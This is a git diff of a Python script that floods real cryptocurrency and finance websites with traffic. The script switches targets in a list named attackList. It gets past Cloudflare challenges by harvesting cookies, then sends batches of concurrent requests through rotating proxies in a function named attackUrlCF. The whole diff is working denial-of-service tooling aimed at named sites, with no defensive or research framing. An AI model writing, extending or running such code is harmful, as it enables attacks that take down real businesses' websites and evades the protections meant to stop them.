@@ -16,10 +16,10 @@ PROXY_PASS = '123123123'
 PROXY_URL_BASE = 'http://'+PROXY_USER+':'+PROXY_PASS+'@gate.smartproxy.com:PORT'
 
 attackList = [
-# 'https://coinspot.nl/fr',
+'https://coinspot.nl/fr',
 # 'https://cryptonaute.fr',
-'https://www.finaria.it',
-# 'https://icowatchlist.com',
+# 'https://www.finaria.it',
+'https://icowatchlist.com',
 # 'https://coincierge.de',
 # 'https://grunwerg.co.uk/search?type=product%2Carticle%2Cpage&options%5Bprefix%5D=last&q='
 # 'https://tradingplatforms.com'
@@ -84,13 +84,15 @@ def solveChanellnge(url):
 			print(status,cookies,userAgent)
 
 			cookiesStr=''
+			cookiesDict = {}
 			for cookie in cookies:
 				cookiesStr = cookiesStr + cookie['name']+'='+cookie['value']+'; '
+				cookiesDict[cookie['name']] = cookie['value']
 			cookiesStr = cookiesStr[:-2]
 			# print('got cookies:')
 			# print(cookiesStr)
 
-			return cookiesStr, userAgent, proxies
+			return cookiesDict, userAgent, proxies
 		except Exception as err:
 			print('error in solving, trying again', err)
 
@@ -106,19 +108,17 @@ def attackUrlCF(baseUrl):
 			headers={'User-Agent': userAgent,
 			'Accept-Language': 'en-US,en;q=0.9',
 			'Accept-Encoding': 'gzip, deflate',
-			'Cookie': cookiesStr,
+			# 'Cookie': cookiesStr,
 			'Connection': 'keep-alive',
 			'Upgrade-Insecure-Requests': '1',
 			}
 
-			print(grequests.map([grequests.get('http://www.xhaus.com/headers', headers=headers)])[0].content)
-			input()
 			# print(proxies, cookiesStr)
 			# print(requests.get('https://api.ipify.org', proxies=proxies).content)
 
 			requestsArr = []
 			for x in range(10):
-				requestsArr.append(grequests.get(url, headers=headers, proxies=proxies))
+				requestsArr.append(grequests.get(url, headers=headers, proxies=proxies, cookies=cookiesStr))
 			#res = requests.post(url, headers=headers, proxies=proxies, data=postData.replace('REPLACE', str(random.randint(0,99999))))
 			res = grequests.map(requestsArr, exception_handler=my_handler)
 			print(baseUrl , res[0])
